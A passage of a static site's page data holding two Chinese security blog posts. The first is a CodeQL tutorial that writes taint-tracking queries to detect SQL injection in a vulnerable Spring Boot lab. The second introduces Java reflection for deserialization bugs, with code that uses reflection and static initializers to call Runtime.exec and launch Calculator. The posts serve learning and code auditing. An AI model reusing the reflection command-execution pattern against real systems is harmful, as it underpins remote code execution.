为什么是CodeQL\n\nCodeQL作为代码安全审计的一款十分好用和高效的工具，并不是凭空出现的。还要从代码审计的历史说起。\n\n在最早期的时候，由于系统规模较小，代码量还比极少，代码之间的逻辑调用关系也很清晰，安全人员通常采用人工的方式去寻找代码中存在的安全问题。而人工审计一般有三种常见的审计思路：第一种是全文通读，在全面的阅读代码之后，对代码有一个全面的理解，知道每一部分代码的功能，然后结合具体的功能发现代码中存在的问题，这种审计的方式十分的细致，但是也十分的耗时；第二种方式是定位危险的函数，然后向上追溯到危险数据输入的位置，如果数据流没有中断则存在一条从用户输入到危险函数的通路，这种方式虽然快捷，但是不全面，对应一些逻辑漏洞无能为力；第三种方式是针对一些特定的功能点进行威胁的建模和审计，这种方式相对较快且对于逻辑漏洞也能有很好的把握。\n\n但是随着项目复杂度和代码量上的指数级增长，人工的方式很难进行全面的审计，因此就需要一些软件的介入，配合人工完成代码审计。这一阶段的一些工具例如rips、Cobra可以帮助定位到危险函数，然后再由人工确认是否存在漏洞。这种方式也是需要依靠人工进行判定，安全人员的压力还是比较大，因此也就迭代出了一些自动化的代码审计产品，例如常用的Checkmarx、Fortify SCA等。CodeQL也是属于这一类型的工具，相较于其他几种工具而言，CodeQL开源、可自定义程度高的优点十分值得安全人员学习和使用。\n\n\n# 环境介绍\n\n这里使用的是l4yn3师傅搭建的靶场，该靶场是使用SpringBoot搭建的，里面包含了一些常见漏洞类型。这一篇就利用CodeQL去自动检索这些漏洞，并减少误报和漏报问题。我的环境配置如下：\n\n * 操作系统：Mac OS\n * Java版本：1.8.0_311\n * maven版本：3.8.4\n * 靶场下载地址：https://github.com/l4yn3/micro_service_seclab/\n\n\n# CodeQL创建并导入数据库\n\n对于CodeQL的环境搭建包括VSCode、CodeQL CLI的相关配置在之前的文章中有详细写过，这里就不再赘述。\n\n在配置完成环境并且将靶场代码克隆到本地之后，我们使用CodeQL CLI的相关命令生成一个数据库：\n\ncodeql database create ./seclab_db --language=java --command="mvn clean install --file pom.xml" --source-root=./micro_service_seclab\n\n# --language 指定语言\n# --command="mvn clean install --file pom.xml" 编译命令Java语言使用maven进行编译\n# --source-root=  项目路径\n\n\n1\n2\n3\n4\n5\n\n\n最终出现Successfully created database代表数据库创建完成了，在创建过程中如果发生报错，可以删除数据库再次运行。注意要保持全路径中没有空格存在。\n\n\n\n在创建完成数据库之后，可以将数据库导入到VSCode中。\n\n\n\n运行hello world测试环境是否正常。\n\nselect "helloworld"\n\n\n1\n\n\n\n\n至此，环境已经搭建好了，数据库也已经导入了。后面就开始编写相应的查询语句。\n\n\n# CodeQL 基础语法\n\n\n# 基础QL\n\n我们利用CodeQL的命令创建了CodeQL数据库，然后需要使用CodeQL提供的开源的规则库编写相关的规则，发现安全漏洞。\n\n\n\nCodeQL是一种类SQL的查询语句，主要由四部分组成：\n\nimport java # 导入语句 导入相关的库\n\nfrom ... # 定义相关的变量\nwhere # 设置查询的条件\nselect # 显示查询的结果\n\n\n1\n2\n3\n4\n5\n\n\n在from语句中，我们通常使用CodeQL提供给我们的很多类库来声明变量。我们经常使用的类库有如下的几个：\n\n名称             解释\nMethod         方法类，Method method表示获取当前项目中所有的方法\nMethodAccess   方法调用类，MethodAccess call表示获取当前项目当中的所有方法调用\nParameter      参数类，Parameter表示获取当前项目当中所有的参数\n\n比如我们可以使用查询语句找出所有名为get*的方法。\n\nimport java\n\nfrom Method method\nwhere method.getName().regexpMatch("get.*")\nselect method.getName(),method.getDeclaringType()\n\n\n1\n2\n3\n4\n5\n\n\n我们可以将where后面的查询条件封装成一个函数，函数的参数为method对象，函数中判断该method是否符合条件，返回True或者false。\n\nimport java\n\npredicate isGetMethod(Method method) {\n    exists( | method.getName().regexpMatch("get.*"))\n}\n\nfrom Method method\n\nwhere isGetMethod(method)\nselect method.getName(),method.getDeclaringType()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 设置source和sink\n\nsources、sinks、sanitizer是污点分析中的核心三元组。sources指的是漏洞污染的输入点；sinks指的是漏洞的执行位置；sanitizer称为净化函数，阻断了从sources到sinks的通路。只有当sources和sinks同时存在，并且不存在一个sanitizer阻断sources到sinks的通路则漏洞是存在的。\n\n\n\n在web项目中，source是用户的输入。如果使用的是spring框架搭建的项目，source可以是RequestMapping。我们不需要自己去编写source的规则，CodeQL官方提供了Source，其中包含了大部分的Source入口，常见的Spring框架的入口也在里面。\n\noverride predicate isSource(DataFlow::Node src) {\n    src instanceof RemoteFlowSource\n}\t\n\n\n1\n2\n3\n\n\n在这个靶场中，使用的JDBCTemplates，因此在使用query方法进行查询时，传入sql语句，就是本例中的sinks。sinks的设置使用到了exists子查询语法，exists的语法是：exists(声明变量|判断表达式)。因此我们的sink设置如下：\n\noverride predicate isSink(DataFlow::Node sink) {\n    exists(Method method,MethodAccess call | \n        method.hasName("query")\n        and call.getMethod() = method\n        and sink.asExpr() = call.getArgument(0)\n        )\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 判断连通\n\n我们设置了source和sink，后面比较关键的一步就是判断从source到sink是否连通。因为如果漏洞存在，则必须要从source到sink存在一条通路。好在这项工作由CodeQL完成，CodeQL使用hasFlowPath判断是否连通，参数只需要传入我们设置好的source和sink。\n\nfrom VulConfig config , DataFlow::PathNode source , DataFlow::PathNode sink\nwhere config.hasFlowPath(source, sink)\nselect source.getNode(),source,sink,"source"\n\n\n1\n2\n3\n\n\n\n# 小结版本\n\n到目前为止，我们设置了source、sink，并且使用CodeQL的hasFlowPath判断连通，下一步需要将这些东西组装起来。我们在前面有提到过CodeQL class的概念，我们这里也只需要继承CodeQL提供的用于数据流分析的父类TaintTracking::Configuration即可。最终我们第一版本的代码如下：\n\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.security.QueryInjection\nimport DataFlow::PathGraph\n\nclass VulConfig extends TaintTracking::Configuration {\n    VulConfig(){\n        this = "sqlInjectionConfig"\n    }\n\n    override predicate isSource(DataFlow::Node src) {\n        src instanceof RemoteFlowSource\n    }\n\n    override predicate isSink(DataFlow::Node sink) {\n        exists(Method method,MethodAccess call | \n            method.hasName("query")\n            and call.getMethod() = method\n            and sink.asExpr() = call.getArgument(0)\n            )\n    }\n\n}\n\nfrom VulConfig config , DataFlow::PathNode source , DataFlow::PathNode sink\n\nwhere config.hasFlowPath(source, sink)\nselect source.getNode(),source,sink,"source"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n另外需要注意，注释部分十分的重要，包含了查询的源信息，和最终结果的展示也有很大的关系，因此必须要带上。\n\n/**\n * @id java/examples/vuldemo\n * @name Sql-Injection\n * @description Sql-Injection\n * @kind path-problem\n * @problem.severity warning\n */\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n\n\n# 误报处理\n\n上一步中得出的一些结果中，有一个结果是不可能产生SQL注入问题的，属于误报。当参数类long类型时，恶意SQL语句无法进行拼接和传参，因此不存在SQL注入的可能，我们需要将其从结果中排除。\n\n\n\n我们排出误报的方法就是使用sanitizer\n\n\n\nCodeQL提供了一个isSanitizer方法，该方法和isSource、isSink一样，都是TaintTracking::Configuration提供的净化方法。CodeQL在该方法中提供了默认的基础数据类型的过滤，但是对于List这种复合的数据类型需要我们加入到isSanitizer中。\n\noverride predicate isSanitizer(DataFlow::Node node){\n    node.getType() instanceof PrimitiveType or\n    node.getType() instanceof BoxedType or\n    node.getType() instanceof NumberType or\n    exists(ParameterizedType pt | node.getType() = pt \n        and pt.getTypeArgument(0) instanceof NumberType )\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n以上代码的意思为：如果当前node节点的类型为基础类型，数字类型和泛型数字类型(比如List)时，就切断数据流，认为数据流断掉了，不会继续往下检测。重新执行query，误报就已经解决了。\n\n\n# 漏报解决\n\n根据ly4n3师傅的文章，存在一个漏报，因为Optional这种类型的使用没有在CodeQL的语法库里，所以username.get()无法识别就断掉了。但是我在测试的时候发现，似乎CodeQL能够识别这条通路了，可能CodeQL更新了吧。这里就简单提一下如果出现了漏报怎么解决。\n\nCodeQL提供了一个isAdditionalTaintStep方法，该方法可以将断掉的数据通路接上。\n\n\n\nisAdditionalTaintStep方法是CodeQL的类TaintTracking::Configuration提供的的方法。它的作用是将一个可控节点，A强制传递给另外一个节点B，那么节点B也就成了可控节点。\n\nl4yn3给的代码：\n\n/**\n * @id java/examples/vuldemo\n * @name Sql-Injection\n * @description Sql-Injection\n * @kind path-problem\n * @problem.severity warning\n */\n\nimport java\nimport semmle.code.java.dataflow.FlowSources\nimport semmle.code.java.security.QueryInjection\nimport DataFlow::PathGraph\n\npredicate isTaintedString(Expr expSrc, Expr expDest) {\n    exists(Method method, MethodAccess call, MethodAccess call1 | expSrc = call1.getArgument(0) and expDest=call and call.getMethod() = method and method.hasName("get") and method.getDeclaringType().toString() = "Optional<String>" and call1.getArgument(0).getType().toString() = "Optional<String>"  )\n}\n\nclass VulConfig extends TaintTracking::Configuration {\n  VulConfig() { this = "SqlInjectionConfig" }\n\n  override predicate isSource(DataFlow::Node src) { src instanceof RemoteFlowSource }\n\n  override predicate isSanitizer(DataFlow::Node node) {\n    node.getType() instanceof PrimitiveType or\n    node.getType() instanceof BoxedType or\n    node.getType() instanceof NumberType or\n    exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )\n  }\n\n  override predicate isSink(DataFlow::Node sink) {\n    exists(Method method, MethodAccess call |\n      method.hasName("query")\n      and\n      call.getMethod() = method and\n      sink.asExpr() = call.getArgument(0)\n    )\n  }\noverride predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) {\n    isTaintedString(node1.asExpr(), node2.asExpr())\n  }\n}\n\n\nfrom VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink\nwhere config.hasFlowPath(source, sink)\nselect source.getNode(), source, sink, "source"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# 参考资料\n\nl4yn3 Freebuf：https://www.freebuf.com/articles/web/283795.html\n\nCodeQL 文档：https://codeql.github.com/docs/',normalizedContent:'# codeql从入门到放弃\n\n> 这篇文章是我在学习codeql时的笔记，该文章完全参考了l4yn3师傅在freebuf上发表《codeql从入门到放弃》。文章的链接会放到参考资料中。至于为什么要重新写一篇类似的文章，只是单纯为了记录一下自己学习codeql使用的过程遇到的问题。\n\n\n# 为什么是codeql\n\ncodeql作为代码安全审计的一款十分好用和高效的工具，并不是凭空出现的。还要从代码审计的历史说起。\n\n在最早期的时候，由于系统规模较小，代码量还比极少，代码之间的逻辑调用关系也很清晰，安全人员通常采用人工的方式去寻找代码中存在的安全问题。而人工审计一般有三种常见的审计思路：第一种是全文通读，在全面的阅读代码之后，对代码有一个全面的理解，知道每一部分代码的功能，然后结合具体的功能发现代码中存在的问题，这种审计的方式十分的细致，但是也十分的耗时；第二种方式是定位危险的函数，然后向上追溯到危险数据输入的位置，如果数据流没有中断则存在一条从用户输入到危险函数的通路，这种方式虽然快捷，但是不全面，对应一些逻辑漏洞无能为力；第三种方式是针对一些特定的功能点进行威胁的建模和审计，这种方式相对较快且对于逻辑漏洞也能有很好的把握。\n\n但是随着项目复杂度和代码量上的指数级增长，人工的方式很难进行全面的审计，因此就需要一些软件的介入，配合人工完成代码审计。这一阶段的一些工具例如rips、cobra可以帮助定位到危险函数，然后再由人工确认是否存在漏洞。这种方式也是需要依靠人工进行判定，安全人员的压力还是比较大，因此也就迭代出了一些自动化的代码审计产品，例如常用的checkmarx、fortify sca等。codeql也是属于这一类型的工具，相较于其他几种工具而言，codeql开源、可自定义程度高的优点十分值得安全人员学习和使用。\n\n\n# 环境介绍\n\n这里使用的是l4yn3师傅搭建的靶场，该靶场是使用springboot搭建的，里面包含了一些常见漏洞类型。这一篇就利用codeql去自动检索这些漏洞，并减少误报和漏报问题。我的环境配置如下：\n\n * 操作系统：mac os\n * java版本：1.8.0_311\n * maven版本：3.8.4\n * 靶场下载地址：https://github.com/l4yn3/micro_service_seclab/\n\n\n# codeql创建并导入数据库\n\n对于codeql的环境搭建包括vscode、codeql cli的相关配置在之前的文章中有详细写过，这里就不再赘述。\n\n在配置完成环境并且将靶场代码克隆到本地之后，我们使用codeql cli的相关命令生成一个数据库：\n\ncodeql database create ./seclab_db --language=java --command="mvn clean install --file pom.xml" --source-root=./micro_service_seclab\n\n# --language 指定语言\n# --command="mvn clean install --file pom.xml" 编译命令java语言使用maven进行编译\n# --source-root=  项目路径\n\n\n1\n2\n3\n4\n5\n\n\n最终出现successfully created database代表数据库创建完成了，在创建过程中如果发生报错，可以删除数据库再次运行。注意要保持全路径中没有空格存在。\n\n\n\n在创建完成数据库之后，可以将数据库导入到vscode中。\n\n\n\n运行hello world测试环境是否正常。\n\nselect "helloworld"\n\n\n1\n\n\n\n\n至此，环境已经搭建好了，数据库也已经导入了。后面就开始编写相应的查询语句。\n\n\n# codeql 基础语法\n\n\n# 基础ql\n\n我们利用codeql的命令创建了codeql数据库，然后需要使用codeql提供的开源的规则库编写相关的规则，发现安全漏洞。\n\n\n\ncodeql是一种类sql的查询语句，主要由四部分组成：\n\nimport java # 导入语句 导入相关的库\n\nfrom ... # 定义相关的变量\nwhere # 设置查询的条件\nselect # 显示查询的结果\n\n\n1\n2\n3\n4\n5\n\n\n在from语句中，我们通常使用codeql提供给我们的很多类库来声明变量。我们经常使用的类库有如下的几个：\n\n名称             解释\nmethod         方法类，method method表示获取当前项目中所有的方法\nmethodaccess   方法调用类，methodaccess call表示获取当前项目当中的所有方法调用\nparameter      参数类，parameter表示获取当前项目当中所有的参数\n\n比如我们可以使用查询语句找出所有名为get*的方法。\n\nimport java\n\nfrom method method\nwhere method.getname().regexpmatch("get.*")\nselect method.getname(),method.getdeclaringtype()\n\n\n1\n2\n3\n4\n5\n\n\n我们可以将where后面的查询条件封装成一个函数，函数的参数为method对象，函数中判断该method是否符合条件，返回true或者false。\n\nimport java\n\npredicate isgetmethod(method method) {\n    exists( | method.getname().regexpmatch("get.*"))\n}\n\nfrom method method\n\nwhere isgetmethod(method)\nselect method.getname(),method.getdeclaringtype()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 设置source和sink\n\nsources、sinks、sanitizer是污点分析中的核心三元组。sources指的是漏洞污染的输入点；sinks指的是漏洞的执行位置；sanitizer称为净化函数，阻断了从sources到sinks的通路。只有当sources和sinks同时存在，并且不存在一个sanitizer阻断sources到sinks的通路则漏洞是存在的。\n\n\n\n在web项目中，source是用户的输入。如果使用的是spring框架搭建的项目，source可以是requestmapping。我们不需要自己去编写source的规则，codeql官方提供了source，其中包含了大部分的source入口，常见的spring框架的入口也在里面。\n\noverride predicate issource(dataflow::node src) {\n    src instanceof remoteflowsource\n}\t\n\n\n1\n2\n3\n\n\n在这个靶场中，使用的jdbctemplates，因此在使用query方法进行查询时，传入sql语句，就是本例中的sinks。sinks的设置使用到了exists子查询语法，exists的语法是：exists(声明变量|判断表达式)。因此我们的sink设置如下：\n\noverride predicate issink(dataflow::node sink) {\n    exists(method method,methodaccess call | \n        method.hasname("query")\n        and call.getmethod() = method\n        and sink.asexpr() = call.getargument(0)\n        )\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 判断连通\n\n我们设置了source和sink，后面比较关键的一步就是判断从source到sink是否连通。因为如果漏洞存在，则必须要从source到sink存在一条通路。好在这项工作由codeql完成，codeql使用hasflowpath判断是否连通，参数只需要传入我们设置好的source和sink。\n\nfrom vulconfig config , dataflow::pathnode source , dataflow::pathnode sink\nwhere config.hasflowpath(source, sink)\nselect source.getnode(),source,sink,"source"\n\n\n1\n2\n3\n\n\n\n# 小结版本\n\n到目前为止，我们设置了source、sink，并且使用codeql的hasflowpath判断连通，下一步需要将这些东西组装起来。我们在前面有提到过codeql class的概念，我们这里也只需要继承codeql提供的用于数据流分析的父类tainttracking::configuration即可。最终我们第一版本的代码如下：\n\nimport java\nimport semmle.code.java.dataflow.flowsources\nimport semmle.code.java.security.queryinjection\nimport dataflow::pathgraph\n\nclass vulconfig extends tainttracking::configuration {\n    vulconfig(){\n        this = "sqlinjectionconfig"\n    }\n\n    override predicate issource(dataflow::node src) {\n        src instanceof remoteflowsource\n    }\n\n    override predicate issink(dataflow::node sink) {\n        exists(method method,methodaccess call | \n            method.hasname("query")\n            and call.getmethod() = method\n            and sink.asexpr() = call.getargument(0)\n            )\n    }\n\n}\n\nfrom vulconfig config , dataflow::pathnode source , dataflow::pathnode sink\n\nwhere config.hasflowpath(source, sink)\nselect source.getnode(),source,sink,"source"\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n另外需要注意，注释部分十分的重要，包含了查询的源信息，和最终结果的展示也有很大的关系，因此必须要带上。\n\n/**\n * @id java/examples/vuldemo\n * @name sql-injection\n * @description sql-injection\n * @kind path-problem\n * @problem.severity warning\n */\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n\n\n# 误报处理\n\n上一步中得出的一些结果中，有一个结果是不可能产生sql注入问题的，属于误报。当参数类long类型时，恶意sql语句无法进行拼接和传参，因此不存在sql注入的可能，我们需要将其从结果中排除。\n\n\n\n我们排出误报的方法就是使用sanitizer\n\n\n\ncodeql提供了一个issanitizer方法，该方法和issource、issink一样，都是tainttracking::configuration提供的净化方法。codeql在该方法中提供了默认的基础数据类型的过滤，但是对于list这种复合的数据类型需要我们加入到issanitizer中。\n\noverride predicate issanitizer(dataflow::node node){\n    node.gettype() instanceof primitivetype or\n    node.gettype() instanceof boxedtype or\n    node.gettype() instanceof numbertype or\n    exists(parameterizedtype pt | node.gettype() = pt \n        and pt.gettypeargument(0) instanceof numbertype )\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n以上代码的意思为：如果当前node节点的类型为基础类型，数字类型和泛型数字类型(比如list)时，就切断数据流，认为数据流断掉了，不会继续往下检测。重新执行query，误报就已经解决了。\n\n\n# 漏报解决\n\n根据ly4n3师傅的文章，存在一个漏报，因为optional这种类型的使用没有在codeql的语法库里，所以username.get()无法识别就断掉了。但是我在测试的时候发现，似乎codeql能够识别这条通路了，可能codeql更新了吧。这里就简单提一下如果出现了漏报怎么解决。\n\ncodeql提供了一个isadditionaltaintstep方法，该方法可以将断掉的数据通路接上。\n\n\n\nisadditionaltaintstep方法是codeql的类tainttracking::configuration提供的的方法。它的作用是将一个可控节点，a强制传递给另外一个节点b，那么节点b也就成了可控节点。\n\nl4yn3给的代码：\n\n/**\n * @id java/examples/vuldemo\n * @name sql-injection\n * @description sql-injection\n * @kind path-problem\n * @problem.severity warning\n */\n\nimport java\nimport semmle.code.java.dataflow.flowsources\nimport semmle.code.java.security.queryinjection\nimport dataflow::pathgraph\n\npredicate istaintedstring(expr expsrc, expr expdest) {\n    exists(method method, methodaccess call, methodaccess call1 | expsrc = call1.getargument(0) and expdest=call and call.getmethod() = method and method.hasname("get") and method.getdeclaringtype().tostring() = "optional<string>" and call1.getargument(0).gettype().tostring() = "optional<string>"  )\n}\n\nclass vulconfig extends tainttracking::configuration {\n  vulconfig() { this = "sqlinjectionconfig" }\n\n  override predicate issource(dataflow::node src) { src instanceof remoteflowsource }\n\n  override predicate issanitizer(dataflow::node node) {\n    node.gettype() instanceof primitivetype or\n    node.gettype() instanceof boxedtype or\n    node.gettype() instanceof numbertype or\n    exists(parameterizedtype pt| node.gettype() = pt and pt.gettypeargument(0) instanceof numbertype )\n  }\n\n  override predicate issink(dataflow::node sink) {\n    exists(method method, methodaccess call |\n      method.hasname("query")\n      and\n      call.getmethod() = method and\n      sink.asexpr() = call.getargument(0)\n    )\n  }\noverride predicate isadditionaltaintstep(dataflow::node node1, dataflow::node node2) {\n    istaintedstring(node1.asexpr(), node2.asexpr())\n  }\n}\n\n\nfrom vulconfig config, dataflow::pathnode source, dataflow::pathnode sink\nwhere config.hasflowpath(source, sink)\nselect source.getnode(), source, sink, "source"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# 参考资料\n\nl4yn3 freebuf：https://www.freebuf.com/articles/web/283795.html\n\ncodeql 文档：https://codeql.github.com/docs/',charsets:{cjk:!0},lastUpdated:"2022/04/05, 13:01:38",lastUpdatedTimestamp:1649163698e3},{title:"反序列化漏洞原理 - 反射",frontmatter:{title:"反序列化漏洞原理 - 反射",date:"2022-03-12T00:00:00.000Z",permalink:"/sec/vuln/deserialization/reflaction",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"原创",categories:["漏洞原理","反序列化漏洞"],tags:["反序列化","漏洞原理"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/201.%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/2010.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/00.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86-%E5%8F%8D%E5%B0%84.html",relativePath:"02.安全/201.漏洞原理/2010.反序列化漏洞/00.反序列化原理-反射.md",key:"v-0866a376",path:"/sec/vuln/deserialization/reflaction/",headers:[{level:2,title:"获取类对象的三种方法",slug:"获取类对象的三种方法",normalizedTitle:"获取类对象的三种方法",charIndex:743},{level:3,title:"获取类的对象的方式",slug:"获取类的对象的方式",normalizedTitle:"获取类的对象的方式",charIndex:2486},{level:2,title:"获取类中的方法",slug:"获取类中的方法",normalizedTitle:"获取类中的方法",charIndex:3380},{level:2,title:"获取类中的属性",slug:"获取类中的属性",normalizedTitle:"获取类中的属性",charIndex:5102}],headersStr:"获取类对象的三种方法 获取类的对象的方式 获取类中的方法 获取类中的属性",content:'# 反序列化原理 - 反射\n\n要想知道什么是反射，首先需要明白什么是“正”。在正常情况下，我们创建对象的方式，就像下面这个例子，我们想要创建Student类的对象，并调用其中的sayHello方法：\n\nStudent student = new Student();\nstudent.sayHello();\n\n\n1\n2\n\n\n如同上面代码那样，因为我们事先已经知道了我要要创建哪个类的对象，因此我使用关键字new去创建想要的对象。可以将这种方法理解为“正”。那么，如果我们不知道我们要创建哪个类的对象呢？你可能想到使用变量来代替上面new后面的类名，但是在java中，这是不行的。\n\nString className = "Student";\nStudent student = new className();\n\n\n1\n2\n\n\n因此，在JDK中提供了一种反射的机制，通过这种机制可以动态的创建出未知类的对象。\n\nClass<?> clazz = Class.forName("com.pwddd.reflaction.Student");\nConstructor<?> constructor = clazz.getConstructor();\nStudent s = (Student) constructor.newInstance();\ns.sayHello();\n\n\n1\n2\n3\n4\n\n\n使用这种方式创建对象并调用方法和使用new的方式创建对象在执行结果上没有什么区别，不同的是我们在执行这段代码之前，可以不知道创建的是哪个类的对象。\n\n所以，什么是反射？\n\n反射，就是在运行程序前并不知道要创建哪个类的对象，但是可以在运行时动态的获取类的完整结构，并调用其中的方法。\n\n\n# 获取类对象的三种方法\n\n 1. Class.forName方式\n    \n    Class<?> clazz = Class.forName("com.pwddd.reflaction.Student");\n    \n    \n    1\n    \n\n 2. Xxx.class方式\n    \n    Class<Student> stuClazz = Student.class;\n    \n    \n    1\n    \n\n 3. xxx.getClass方式\n    \n    Class<? extends Student> clazz = student.getClass();\n    \n    \n    1\n    \n\n对于第一种方式，forName方法还有一个重载的方法如下：\n\npublic static Class<?> forName(String name, boolean initialize,ClassLoader loader)\n\n\n1\n\n\n该方法有三个参数，第一个参数为反射生成Class类对象的全类名，第二个参数为是否进行初始化，第三个参数是类加载器。对于第二个参数，如果设置为true，则会进行类的初始化，但是并不会调用构造函数。\n\n如果我们知道存在一个类的全类名，在这个类的初始化块中存在恶意的代码，那么我们就可以利用反射去执行这段代码。（在正常的开发中，一般没有这种类）\n\npackage com.pwddd.reflaction;\n\nimport java.io.IOException;\n\npublic class MyErrorClass {\n  static {\n    try {\n      System.out.println("static");\n      Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");\n    } catch (IOException e) {\n      e.printStackTrace();\n    }\n  }\n\n  {\n    try {\n      System.out.println("common block");\n      Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");\n    } catch (IOException e) {\n      e.printStackTrace();\n    }\n  }\n\n  public MyErrorClass() {\n    System.out.println("consructor....");\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n使用反射创建对象。\n\nClass<?> clazz = Class.forName("com.pwddd.reflaction.MyErrorClass",true, TestReflaction.class.getClassLoader());\n\n\n1\n\n\n我们会发现，系统弹出了计算器，并且在控制台打印了static。这也印证了前面的说法，当第二个参数为true时，会进行类的初始化，执行静态代码块中的内容。而非静态代码块中的内容在创建对象的时候会执行。当我们使用forName的另一个重载方法进行反射时，发现同样也执行了static代码块的内容，这是因为forName单参数方法和三个参数的forName方法最终都会调用forName0方法，initialize参数都为true，并将初始化参数设置为true。\n\nreturn forName0(className, true, ClassLoader.getClassLoader(caller), caller);\n\n\n1\n\n\n\n# 获取类的对象的方式\n\n 1. 使用类对象的newInstance方法。\n    \n    Class<?> clazz = Class.forName("com.pwddd.reflaction.Student");\n    Student student = (Student) clazz.newInstance();\n    \n    \n    1\n    2\n    \n\n 2. 获取构造器，调用构造器获取对象。\n    \n    Class<?> clazz = Class.forName("com.pwddd.reflaction.Student");\n    Constructor<?> constructor = clazz.getConstructor();\n    Student student = (Student) constructor.newInstance();\n    \n    \n    1\n    2\n    3\n    \n\n第一种方式获取对象，实际上是调用了类的无参构造方法，如果没有无参构造方法（或无参构造方法非public），则会报错。\n\n\n\n那么对于有些类（例如：Runtime类），我们怎么获取其对象呢？\n\nClass<?> clazz = Class.forName("java.lang.Runtime");\nRuntime runtime = (Runtime) clazz.newInstance();\nSystem.out.println(runtime);\n\n\n1\n2\n3\n\n\n我们发现，直接使用newInstance方法无法创建对象。查看Runtime源码发现，该类的构造方法设置为了private。\n\n\n\n这实际上是单例设计模式的常见写法，所谓单例设计模式，简单理解就是无法使用new的方式创建对象，提供一个静态的方法获取对象，以保证对象的唯一性。如Runtime对象所示：\n\n\n\n那么我们要怎样才能获取到这种类的对象呢？我们需要先获取到这个类的指定的方法，通常为get类名方法，该方法的返回值是这个类的对象。\n\n\n# 获取类中的方法\n\n在获取到类对象后，可以调用类对象的getMethod方法获取到指定的方法，或者创建该类的对象，使用对象调用方法。\n\n// 获取Method方法对象，调用invoke执行方法\nClass<?> clazz = Class.forName("com.pwddd.reflaction.Student");\nMethod sayHello = clazz.getMethod("sayHello");\nsayHello.invoke(clazz.newInstance());\n\n// 创建指定类的实例，调用方法\nStudent student = (Student) clazz.newInstance();\nstudent.sayHello();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n其中，在调用invoke时，第一个参数为调用指定方法的类的对象，可变参数为方法的参数。\n\n对于类中的非public方法，可以使用getDeclaredMethod获取到指定的方法。还需要设置可访问为true，否则会报错无法访问。\n\nClass<?> clazz = Class.forName("com.pwddd.reflaction.Student");\nMethod privateSayHello = clazz.getDeclaredMethod("privateSayHello", String.class);\nprivateSayHello.setAccessible(true);\nprivateSayHello.invoke(clazz.newInstance(),"zhangsan");\n\n\n1\n2\n3\n4\n\n\n在上一节中，我们发现当构造器不存在或者为非public时，无法通过``newInstance`创建对象，那么在知道如何获取类中的方法并且执行后，获取对象就没有什么难度了。\n\n以Runtime方法为例，我们可以获取私有的构造器，然后创建对象。\n\nClass<?> clazz = Class.forName("java.lang.Runtime");\nConstructor<?> declaredConstructor = clazz.getDeclaredConstructor();\ndeclaredConstructor.setAccessible(true);\nRuntime runtime = (Runtime) declaredConstructor.newInstance();\nruntime.exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");\n\n\n1\n2\n3\n4\n5\n\n\n我们也可以获取到Runtime类中的getRuntime方法，执行该方法返回一个Runtime实例。\n\nClass<?> clazz = Class.forName("java.lang.Runtime");\nMethod getRuntime = clazz.getMethod("getRuntime");\nRuntime runtime = (Runtime) getRuntime.invoke(clazz);\nruntime.exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");\n\n\n1\n2\n3\n4\n\n\n那么执行命令的反射写法就可以简化为下面的方式了：\n\nClass<?> clazz = Class.forName("java.lang.Runtime");\nclazz.getMethod("exec", String.class)\n  .invoke(clazz.getMethod("getRuntime")\n       .invoke(clazz),"/System/Applications/Calculator.app/Contents/MacOS/Calculator");\n\n\n1\n2\n3\n4\n\n\n\n# 获取类中的属性\n\n获取类中的属性和获取方法的方式类似，使用getField方法。\n\nClass<?> clazz = Class.forName("com.pwddd.reflaction.Student");\nField userName = clazz.getDeclaredField("userName");\nuserName.setAccessible(true);\nStudent student = (Student) clazz.newInstance();\nuserName.set(student,"zhangsan");\nSystem.out.println(student.getUserName());\n\n\n1\n2\n3\n4\n5\n6\n\n\n以上就是java中反射的基础内容了，有了以上的知识便于我们理解Java反序列化漏洞的原理。',normalizedContent:'# 反序列化原理 - 